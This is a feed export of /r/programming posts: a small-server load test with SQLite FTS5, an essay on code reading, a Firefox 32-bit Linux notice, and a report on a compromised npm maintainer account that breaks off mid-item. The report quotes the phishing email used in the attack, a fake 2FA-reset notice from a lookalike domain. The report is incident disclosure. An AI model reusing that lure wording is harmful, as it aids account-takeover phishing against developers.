<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="http://192.168.1.132/?platform=reddit&amp;subreddit=programming&amp;averagePostsPerDay=5&amp;content&amp;view=rss" rel="self" type="application/rss+xml"/><title>/r/programming</title><description>Hot posts in /r/programming (roughly 5 posts per day)</description><link>https://www.reddit.com/r/programming/</link><language>en-us</language><lastBuildDate>Tue, 09 Sep 2025 23:37:19 +0000</lastBuildDate><generator>Upvote RSS</generator><image><url>https://styles.redditmedia.com/t5_2fwo/styles/communityIcon_1bqa1ibfp8q11.png</url><title>/r/programming</title><link>https://www.reddit.com/r/programming/</link></image><item><link>https://blog.epsiolabs.com/i-love-uuid-i-hate-uuid</link><title>I love UUID, I hate UUID (blog.epsiolabs.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncht77/i_love_uuid_i_hate_uuid/</guid><comments>https://www.reddit.com/r/programming/comments/1ncht77/i_love_uuid_i_hate_uuid/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 1 min | <a href='https://www.reddit.com/r/programming/comments/1ncht77/i_love_uuid_i_hate_uuid/'>Post permalink</a></p></section><section class='preview-image'><img src='https://blog.epsiolabs.com/api/og/post?og=eyJ0aXRsZSI6IkklMjBsb3ZlJTIwVVVJRCUyQyUyMEklMjBoYXRlJTIwVVVJRCIsImF1dGhvciI6Ik1hb3IlMjBLZXJuIiwiZG9tYWluIjoiYmxvZy5lcHNpb2xhYnMuY29tIiwicGhvdG8iOiJodHRwczovL2Nkbi5oYXNobm9kZS5jb20vcmVzL2hhc2hub2RlL2ltYWdlL3VwbG9hZC92MTczNjQ0OTc1MDE5Ny8wMzU5YjBkNC1iYzIzLTRjMDAtODE4Zi0zM2JlN2ZiYjBkNjIucG5nIiwiYmdjb2xvciI6IiNmMWYyZjYiLCJyZWFkVGltZSI6Nn0=' /></section><section class='parsed-content'><div><p>Vercel Security Checkpoint</p><p>|</p><p>bom1::1757437374-6sa9o22QC2d5wOkKXHjcaEiqF0yACM9x</p></div></section>]]></description><pubDate>Tue, 09 Sep 2025 18:10:41 +0530</pubDate></item><item><link>https://rafaelviana.com/posts/hug-of-death</link><title>Can a tiny server running FastAPI/SQLite survive the hug of death? (rafaelviana.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncan42/can_a_tiny_server_running_fastapisqlite_survive/</guid><comments>https://www.reddit.com/r/programming/comments/1ncan42/can_a_tiny_server_running_fastapisqlite_survive/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1ncan42/can_a_tiny_server_running_fastapisqlite_survive/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I run tiny indie apps on a Linux box. On a good day, I get ~300 visitors. But what if I hit a lot of traffic? Could my box survive the <em>hug of death</em>?</p><p>So I load tested it:</p><ul><li>Reads? 100 RPS with no errors.</li><li>Writes? Fine after enabling WAL.</li><li>Search? Broke… until I switched to SQLite FTS5.</li></ul></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://rafaelviana.com/preview.png?v=5' /></section><section class='parsed-content'><div><p>I build indie applications of very modest size.<br> On a good day, one of my posts might do alright on Reddit and send me ~300 visitors.</p><p>But what if I actually made it to Reddit&rsquo;s <strong>front page</strong>?<br> Could my humble box - 1 CPU core and 2 GB of RAM - handle the dreaded <em>hug of death</em>?</p><p>Let&rsquo;s find out:</p><hr> <h2>My Reality Check ($12 Box)</h2> <ul> <li><strong>Specs:</strong> 1 CPU core, 2 GB RAM, 50 GB storage</li> <li><strong>Stack:</strong> Python (FastAPI), HTMX, SQLite</li> <li><strong>Cost:</strong> $12/month</li> </ul><p>This isn&rsquo;t a Kubernetes cluster. It&rsquo;s not a microservices playground.<br> It&rsquo;s one small VPS where all my apps live.</p><hr> <h2>Constraints</h2><p>To keep this experiment honest, I set some rules:</p><ul> <li><strong>No upgrades</strong> - no extra CPU/RAM.</li> <li><strong>No language switch</strong> - no C++/Rust.</li> <li><strong>No database swap</strong> - SQLite stays.</li> </ul><p>The challenge is to see what my David can do against Goliath (Reddit).</p><hr> <h2>What Really Matters</h2><p>Total visitors per day doesn&rsquo;t tell you much.<br> What matters is how many requests hit your server <strong>at the same time</strong> &mdash; the bursts.</p><p>Not American sniper - more like John Wick avenging his dog.</p><hr> <h3>From RPS to Users</h3><p>Assuming a typical web user makes 1 request every 10&ndash;30 seconds (&asymp;0.05&ndash;0.1 RPS per user).</p><p>If my server can handle <strong>100 requests per second (RPS):</strong> that translates to about 1,000&ndash;2,000 simultaneous users.</p><p><span><span><span><math><semantics><mrow><mtext>Simultaneous&nbsp;users</mtext><mo>&asymp;</mo><mfrac><mn>100</mn><mrow><mn>0.05</mn><mtext>&nbsp;to&nbsp;</mtext><mn>0.1</mn></mrow></mfrac><mo>=</mo><mn>1,000</mn><mtext>&ndash;</mtext><mn>2,000</mn></mrow><annotation>\text{Simultaneous users} \approx \frac{100}{0.05 \text{ to } 0.1} = 1{,}000 \text{&ndash;} 2{,}000</annotation></semantics></math></span></span></span></p><p>That&rsquo;s the ballpark.</p><hr> <h2>The Test Setup</h2><p>To keep it simple, I used a <strong>tiny CRUD app</strong> as the guinea pig. It covers all the basic operations:</p><ul> <li><strong>Read</strong>: load homepage entries</li> <li><strong>Search</strong>: run queries</li> <li><strong>Write</strong>: add a new entry</li> </ul><p>For load testing, I used <strong><a href="https://github.com/codesenberg/bombardier">bombardier</a></strong> from my laptop, pointing at my live server. <img src="https://rafaelviana.com/assets/blog/htop1.png" alt="Page 4 / 20 connections, CPU barely moving"></p><hr> <h2>First Test: 100 RPS</h2><p>The big question: can my $12 box hold steady under <strong>100 requests per second</strong>, the rough equivalent of 1,000&ndash;2,000 simultaneous users?</p><p><strong>Observation</strong></p><ul> <li>Avg latency: ~140&ndash;160 ms</li> <li>CPU: ~60%</li> <li>No errors</li> </ul><p><strong>Interpretation</strong><br> At 100 RPS, the box didn&rsquo;t break a sweat. This suggests that for reads and simple pages, the $12 server could realistically handle front-page Reddit traffic in bursts.</p><hr> <h2>Search: Where Things Break</h2><p>When I hit <code>/search?q=fastapi</code> with 100 RPS, the picture changed:</p><p><strong>Observation</strong></p><ul> <li>Avg latency: ~174 ms</li> <li>CPU: pegged at 100%</li> <li>Some slowdown under load <img src="https://rafaelviana.com/assets/blog/htop3.png" alt="Page 1 / 200 connections, /search?q=fastapi, CPU pinned 100%"></li> </ul><p><strong>Interpretation</strong><br> Search is the bottleneck. Heavy queries push the CPU to its limit, meaning this is where the $12 box would choke under front-page load.</p><hr> <table> <thead> <tr> <th>Test</th> <th>RPS Target</th> <th>Avg Latency</th> <th>CPU Usage</th> <th>Outcome</th> </tr> </thead> <tbody> <tr> <td>Homepage (Idle)</td> <td>1 RPS</td> <td>~158 ms</td> <td>11%</td> <td>Stable</td> </tr> <tr> <td>Homepage (Burst)</td> <td>100 RPS</td> <td>~140 ms</td> <td>60%</td> <td>Still holding</td> </tr> <tr> <td>Search (Burst)</td> <td>100 RPS</td> <td>~174 ms</td> <td>100%</td> <td>Bottleneck found</td> </tr> </tbody> </table><p>I'm a CRUD monkey. And this app reflects the majority of my apps. A simple get, a tiny write (INSERT + COMMIT) + search (usually it&rsquo;s LIKE <code>%term%</code> on a text column).</p><p>It makes sense for the search to be the problem. SQLite&rsquo;s B-tree index can&rsquo;t help when you search <code>%term%</code>. It has to scan rows one by one.</p><p>So I reached for SQLite&rsquo;s secret weapon: FTS5. It gives you a full-text index, turning those full scans into fast lookups.</p><h2>Make search fast: switch to FTS5</h2><p>FTS5 gives you an inverted index; queries become index lookups instead of table scans.</p><p>What I had:</p><pre><code><span><span>@app<span>.</span>get</span><span>(</span><span>"/search"</span><span>,</span> response_class<span>=</span>HTMLResponse<span>)</span> </span><span><span>def</span> <span>search</span><span>(</span>request<span>:</span> Request<span>,</span> q<span>:</span> <span>str</span> <span>=</span> <span>""</span><span>)</span><span>:</span> </span><span> con <span>=</span> get_db<span>(</span><span>)</span> </span><span> results <span>=</span> <span>[</span><span>]</span> </span><span> <span>if</span> q<span>:</span> </span><span> results <span>=</span> con<span>.</span>execute<span>(</span> </span><span> <span>"SELECT * FROM entries WHERE content LIKE ? ORDER BY created_at DESC LIMIT 20"</span><span>,</span> </span><span> <span>(</span><span><span>f"%</span><span><span>{</span>q<span>}</span></span><span>%"</span></span><span>,</span><span>)</span><span>,</span> </span><span> <span>)</span><span>.</span>fetchall<span>(</span><span>)</span> </span><span> con<span>.</span>close<span>(</span><span>)</span> </span><span> <span>return</span> templates<span>.</span>TemplateResponse<span>(</span> </span><span> <span>"search.html"</span><span>,</span> <span>{</span><span>"request"</span><span>:</span> request<span>,</span> <span>"results"</span><span>:</span> results<span>,</span> <span>"q"</span><span>:</span> q<span>}</span> </span><span> <span>)</span> </span></code></pre><p>After migrating the DB to FTS5 and updating the search endpoint:</p><pre><code><span><span>@app<span>.</span>get</span><span>(</span><span>"/search"</span><span>,</span> response_class<span>=</span>HTMLResponse<span>)</span> </span><span><span>def</span> <span>search</span><span>(</span>request<span>:</span> Request<span>,</span> q<span>:</span> <span>str</span> <span>=</span> Query<span>(</span><span>.</span><span>.</span><span>.</span><span>,</span> min_length<span>=</span><span>2</span><span>,</span> max_length<span>=</span><span>64</span><span>)</span><span>)</span><span>:</span> </span><span> tokens <span>=</span> <span>[</span>t <span>for</span> t <span>in</span> q<span>.</span>split<span>(</span><span>)</span> <span>if</span> t<span>]</span> </span><span> <span>match</span> <span>=</span> <span>" "</span><span>.</span>join<span>(</span><span><span>f"</span><span><span>{</span>t<span>}</span></span><span>*"</span></span> <span>for</span> t <span>in</span> tokens<span>)</span> <span># prefix search</span> </span><span> con <span>=</span> get_db<span>(</span><span>)</span> </span><span> rows <span>=</span> con<span>.</span>execute<span>(</span><span>""" </span></span><span><span> SELECT e.* </span></span><span><span> FROM entries_fts f </span></span><span><span> JOIN entries e ON e.id = f.rowid </span></span><span><span> WHERE f.entries_fts MATCH ? </span></span><span><span> ORDER BY e.created_at DESC </span></span><span><span> LIMIT 20 </span></span><span><span> """</span><span>,</span> <span>(</span><span>match</span><span>,</span><span>)</span><span>)</span><span>.</span>fetchall<span>(</span><span>)</span> </span><span> con<span>.</span>close<span>(</span><span>)</span> </span><span> <span>return</span> templates<span>.</span>get_template<span>(</span><span>"search.html"</span><span>)</span><span>.</span>render<span>(</span>request<span>=</span>request<span>,</span> results<span>=</span>rows<span>,</span> q<span>=</span>q<span>)</span> </span></code></pre><p><strong>Before</strong>: At 100 RPS, search pegged CPU and fell apart with 5xx errors.</p><p><strong>After FTS5 + WAL</strong>: At 100 RPS, search ran clean with ~200 ms latency, 0 errors, and steady throughput.</p><h2>Lessons for Indie Hackers</h2> <ul> <li>Reads are cheap, search is expensive.</li> <li>SQLite is fine, just don&rsquo;t abuse LIKE <code>%term%</code>.</li> <li>WAL mode prevents "DB locked" pain.</li> <li>A $12 box can take a Reddit punch &mdash; you don&rsquo;t need Kubernetes for your MVP.</li> </ul> <h2>Outro</h2><p>Ok, David can take a punch - about 2,000 simultaneous users</p><p>Will it survive thousands more - say 5,000&ndash;25,000 of simultaneous users raw (no caching)? <strong>Absolutely not</strong>.</p><p>But with Nginx micro-caching or a CDN in front - and decent SQL under the hood - even a $12 box can shrug off traffic that looks terrifying on paper.</p><p>For indie hackers, the lesson is simple: <strong>don&rsquo;t overcomplicate &mdash; test your box, fix the bottlenecks, and ship</strong>.</p><p><a href="https://github.com/vianarafael/CheapBoxBench">The Repo, tests, and logs</a></p></div></section>]]></description><pubDate>Tue, 09 Sep 2025 11:01:39 +0530</pubDate></item><item><link>https://idiallo.com/blog/writing-code-is-easy-reading-is-hard</link><title>Writing Code Is Easy. Reading It Isn't (idiallo.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/</guid><comments>https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nbvfcs/writing_code_is_easy_reading_it_isnt/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.idiallo.com/images/assets/548/thumb.jpg' /></section><section class='parsed-content'><div><p>Writing code is easy. Once you have a solution in mind, and have mastered the syntax of your favorite programming language, writing code is easy. Having an LLM write entire functions for you? Even easier. But the hard part isn&rsquo;t the writing. It&rsquo;s the reading. It&rsquo;s the time it takes to load the mental model of the system into your head. That&rsquo;s where all the cost really is.</p><p>A <strong>mental model</strong> is the thing you build when you read code. It&rsquo;s your internal map of how the system works, where the tricky parts are, what depends on what. Without it, you&rsquo;re just staring at lines of text.</p><p>When I worked as a contractor, most of my jobs started the same way. I&rsquo;d get a task to fix a bug or add a new feature in an application I&rsquo;d never seen before. My mental model was clean and empty at first. To start filling it, I&rsquo;d check the homepage to see what it looked like. I&rsquo;d look at the page source: is this React? jQuery? A third-party plugin? I&rsquo;d scan the codebase to see if the carousel they are requesting on the front page was used elsewhere. I&rsquo;d check their build process, their testing setup, the tools they leaned on. Every little detail I discovered got appended to the model in my head.</p><p>It was like moving into a new city. You start at the foot of your apartment, wander a few streets, notice which roads lead to the freeway, where the grocery store is, and slowly you start to orient yourself. That&rsquo;s what reading code feels like: you&rsquo;re building a mental map so you don&rsquo;t get lost every time you move around.</p><p>Say you need to understand a simple function like <code>getUserPreferences(userId)</code>. To build your mental model, you need to trace:</p><ul> <li>Where is this function defined?</li> <li>What does it return? Is it a Promise? What's the shape of the data?</li> <li>Does it hit a database directly or go through an API?</li> <li>Are there caching layers involved?</li> <li>What happens if the user doesn't exist?</li> <li>Who else calls this function and in what contexts?</li> <li>Are there side effects?</li> </ul><p>Understanding that one function means jumping between database schemas, API definitions, error handling middleware, and multiple call sites. Only after building this web of relationships do you have enough context to safely modify anything.</p><p>And it&rsquo;s slow. Reading code is harder than writing it. Much harder. Writing code is forward motion: you&rsquo;re laying down fresh pavement. Reading code means retracing someone else&rsquo;s steps, which usually means jumping between files, chasing function calls, inferring side effects, and deciphering intentions that aren&rsquo;t written down. Understanding one function often means looking at five other files. Only after all that do you have enough of a map to even begin.</p><p>It&rsquo;s the same reason debugging is harder than coding. On Stack Overflow, one of the most common comments you&rsquo;ll see under a bad question is: <em>&ldquo;Can you show us what you did?&rdquo;</em> Without seeing the steps, no one can load the right model in their head to help. It&rsquo;s also why the <a href="https://xyproblem.info/">XY problem</a> keeps coming up. People ask about a symptom without giving the context that would let others reconstruct the whole picture.</p><p>I'm still fascinated by the lawyer who used <a href="https://www.forbes.com/sites/mollybohannon/2023/06/08/lawyer-used-chatgpt-in-court-and-cited-fake-cases-a-judge-is-considering-sanctions/">ChatGPT in court</a>. He filed a brief that cited six cases which turned out not to exist. Everyone asked: why didn&rsquo;t he read them? The answer is the same: it takes time and effort to build the model. He would have had to chase down each case, read them, and slot them into a broader understanding of legal precedent. Reading is the hard part. Generating is easy.</p><p>Reading isn't just about going through the code and examining it line by line. It's also about going through the documentation, code reviews, and peer programming. In fact, these are solutions for accelerating the process of building our mental model. But with that in mind, you still have to, well, read and understand. You'll notice that programmers often want to rewrite things from scratch, because "the old code sucks". What sucks is taking the time to read and understand it.</p><p>And this is what makes LLMs both powerful and dangerous in programming. Whether the AI generates perfect code or complete hallucinations, you still have to read it. You still have to trace through what it&rsquo;s supposed to do, how it interacts with the rest of the system, and what the side effects are. The longer the generated code, the longer it takes to build your mental model. And only once you&rsquo;ve done that can you spot the issues, the places where the generated code doesn&rsquo;t quite fit, or quietly breaks something else.</p><p>When an LLM can produce an infinite amount of code or text, it tempts us to skip the reading. But you can&rsquo;t skip the model. You wouldn&rsquo;t want to load someone else&rsquo;s saved game and be dropped in the middle of a boss fight. That&rsquo;s what it feels like to inherit or generate code you don&rsquo;t understand.</p><p>This is why the real bottleneck in software development isn&rsquo;t writing, it&rsquo;s understanding.</p><hr><p>For now, we don't have the LLM equivalent for understanding. Something that could instantly transfer a complete mental model from the system to your head. Until we do, the bottleneck hasn't moved. We've solved the "typing speed" problem. We can generate more code than we could ever hope to read. But until we solve the "understanding" problem, the cost of software development remains the same: the time it takes for someone to make sense of it all.</p><p>This has real implications for how we use AI tools. Instead of asking AI to generate large blocks of code, we might be better off asking it to help us understand existing code. Instead of measuring productivity by lines of code written, we should measure it by how quickly teams can build accurate mental models of their systems.</p><p>The future of programming might not be about generating more code faster. It might be about generating understanding faster. And that's a much harder problem to solve.</p><hr> </div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:48:00 +0530</pubDate></item><item><link>https://www.openmymind.net/Everything-Is-A-u8-array/</link><title>Everything is a []u8 (openmymind.net)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbvest/everything_is_a_u8/</guid><comments>https://www.reddit.com/r/programming/comments/1nbvest/everything_is_a_u8/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nbvest/everything_is_a_u8/'>Post permalink</a></p></section>]]></description><pubDate>Mon, 08 Sep 2025 23:47:25 +0530</pubDate></item><item><link>https://blog.mozilla.org/futurereleases/2025/09/05/firefox-32-bit-linux-support-to-end-in-2026/</link><title>Firefox 32-bit Linux Support to End in 2026 (blog.mozilla.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/</guid><comments>https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nbv9xc/firefox_32bit_linux_support_to_end_in_2026/'>Post permalink</a></p></section><section class='preview-image'><img src='https://blog.mozilla.org/futurereleases/files/2018/02/cropped-blog-header-future-releases.jpg' /></section><section class='parsed-content'><div><article><div><p>For many years, Mozilla has continued to provide Firefox for 32-bit Linux systems long after most other browsers and operating systems ended support. We made this choice because we care deeply about keeping Firefox available to as many people as possible, helping our users extend the life of their hardware and reduce unnecessary obsolescence.</p><p>Today, however, 32-bit Linux (on x86) is no longer widely supported by the vast majority of Linux distributions, and maintaining Firefox on this platform has become increasingly difficult and unreliable. To focus our efforts on delivering the best and most modern Firefox, we are <b>ending support for 32-bit x86 Linux</b> with the release of Firefox 144 (or to rephrase, Firefox 145 will not have 32-bit Linux support).</p><p>If you are currently using Firefox on a 32-bit x86 Linux system, we strongly encourage you to move to a 64-bit operating system and install the 64-bit version of Firefox, which will continue to be supported and updated.</p><p>For users who cannot transition immediately, Firefox ESR 140 will remain available &mdash; including 32-bit builds &mdash; and will continue to receive security updates until at least <b>September 2026</b>.</p><p>[Updated on 2025-09-09 to clarify the affected builds are 32-bit x86]</p></div></article> </div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:42:28 +0530</pubDate></item><item><link>https://fasterthanli.me/articles/color-npm-package-compromised</link><title>Color NPM Package Compromised (fasterthanli.me)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/</guid><comments>https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 16 min | <a href='https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/_thumb~999ea46822417b69.png' /></section><section class='parsed-content'><div><p><span>Sep 08, 2025</span> <span> <abbr title="Estimated reading time, at 220 words per minute, where one word = 5 characters"> 4 min </abbr> </span> <span> <span><a href="https://fasterthanli.me/tags/npm">#npm</a></span> </span> </p><p>On September 8 2025, around 13:00 UTC, someone compromised <a href="https://www.npmjs.com/~qix">Josh Junon&rsquo;s npm account (qix)</a> and started publishing backdoored versions of his package.</p><p>Someone noticed and let Josh know:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~0ad954d4042cc44e.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~a5ec0b93bba7ec30.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~f4efba9875cd59ab.w900.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4a9e74f87760a4af.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4a9e74f87760a4af.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~a77a052fa30939ec.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~2c4593ff2e898847.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~424c77cae67f76e3.w900.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~2a91320fae70db76.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~2a91320fae70db76.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4b4a2f263f473471.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4b2488064d4e9adb.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~ca45cce753873308.w900.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~33efd9d23f34908e.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~33efd9d23f34908e.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/charlie-noticed@2x~4a9e74f87760a4af.jxl" width="595" height="177" title alt="Hey. Your npm account seems to have been compromised. 1 hour ago it started posting packages with backdoors to all your popular packages. "></source></source></source></source></source></source></source></source></source></picture><figcaption><cite><a href="https://bsky.app/profile/charlieeriksen.bsky.social/post/3lydffcyulc2n%20">Charlie Eriksen on BlueSky </a></cite></figcaption> </figure><p>Josh confirmed he&rsquo;d gotten pwned by a fake 2FA (two-factor authentication) reset e-mail:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~a179783538de1f4d.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~7c915c01a7921e87.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~1a4695014120bb13.w900.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ca37f72d582a4442.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ca37f72d582a4442.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~a8368bb997745224.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~731a6e9261ec5aa6.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~2ef1999737857730.w900.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~0625d89fd48a2fad.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~0625d89fd48a2fad.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~97b58ff0b566eb23.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ab64f921056092b7.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~6f99f1fb2081d88c.w900.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ff16c7198a608a53.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ff16c7198a608a53.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/josh-fake-2fa@2x~ca37f72d582a4442.jxl" width="592" height="396" title alt="Yep, I've been pwned. 2FA reset email, looked very legitimate. Only NPM affected. I've sent an email off to @npmjs.bsky.social to see if I can get access again. Sorry everyone, I should have paid more attention. Not like me; have had a stressful week. Will work to get this cleaned up. "></source></source></source></source></source></source></source></source></source></picture><figcaption><cite><a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydioq5swk2y%20">Josh Junon on BlueSky </a></cite></figcaption> </figure><p>The phishing e-mail came from <code>npmsj.help</code> (registered 3 days prior) and claimed users had to reset their 2FA:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~043bc42a26dd4329.w400.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~335445f45f56de09.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~335445f45f56de09.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~13cd7cd41ec06bdb.w400.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~66555f22b3ea4c6f.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~66555f22b3ea4c6f.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~4f142a1c7ef38fc8.w400.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~e6efbb081147cfbe.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~e6efbb081147cfbe.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/phishing-email~335445f45f56de09.jxl" width="783" height="895" title="The 2FA phishing e-mail " alt="Hi, gix! As part of our ongoing commitment to account security, we are requesting that all users update their Two-Factor Authentication (2FA) credentials. Our records indicate that it has been over 12 months since your last 2FA update. | To maintain the security and integrity of your account, we kindly ask that you complete this update at your earliest convenience. Please note that accounts with outdated 2FA credentials will be temporarily locked starting September 10, 2025, to prevent unauthorized access. Update 2FA Now "></source></source></source></source></source></source></picture><figcaption><p>The 2FA phishing e-mail</p><cite><a href="https://news.ycombinator.com/item?id=45170070%20">junon on HN </a></cite></figcaption> </figure><p>The <a href="https://gist.github.com/Qix-/c1f0d4f0d359dffaeec48dbfa1d40ee9/">raw email</a> is available for the curious &mdash; it looks like it was sent via <a href="https://mailtrap.io/">mailtrap</a> (I&rsquo;ve sent them an e-mail about it).</p><p>Over on Mastodon, Kevin Beaumont provided <a href="https://cyberplace.social/@GossiTheDog/115169390397282254">a list of affected packages</a>:</p><figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~fa84ac1945dcaa2f.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~178d237f446798e5.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~61a72ac780288b48.w900.jxl 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~3a16d2da11dfcac5.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~3a16d2da11dfcac5.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~2e67bd310f3ccf34.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~379e95c920fab669.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~a8f4e7fc62452e1b.w900.avif 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~8d544b6cfdc992a6.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~8d544b6cfdc992a6.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~c17402d6f0f5cf8d.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~550e7cd5380d4848.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~b896fd52cf1cec16.w900.webp 1x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~9bdc0e2b81b4c538.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~9bdc0e2b81b4c538.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/gossi-list-of-pkgs@2x~3a16d2da11dfcac5.jxl" width="637" height="444" title alt=" Kevin Beaumont GossiTheDog@cyberplace.social Malicious javascript compromise on 